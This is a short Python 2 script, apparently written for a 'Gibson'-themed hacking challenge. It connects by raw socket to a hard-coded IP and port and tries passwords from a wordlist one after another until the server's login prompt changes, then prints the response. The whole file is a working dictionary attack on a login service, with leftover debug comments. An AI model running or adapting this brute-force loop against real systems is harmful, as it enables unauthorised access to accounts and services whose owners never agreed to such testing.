__author__ = 'Charles'

import socket

ip = "54.201.246.241"
port = 1339

i = 0

s = socket.socket()

s.connect((ip,port))

password_file = open("wordlist.txt","r")
#python automatically creates a file if it does not exist and you tell it to write
our_file = open("ourlist.txt","w")



#print from file
#newline character is read in as part of the file so if printed then there is no need for the newline char /n
#pass1 = password_file.readline()
#pass2 = password_file.readline()
while i < 287:
    pass1 = password_file.readline()
    #print pass1,i
    s.send(pass1)
    server_print = s.recv(100)
    #print("Server print is:",server_print)
    if "login to the Gibson:" not in server_print:
        print server_print
        break
    i += 1

#print(pass1)
#print(pass2)

#write to file
#our_file.write("Hack the Planet!\n")
#our_file.write("or Nah\n")
#our_file.write(pass1)






#close files when done
password_file.close()
our_file.close()
s.close()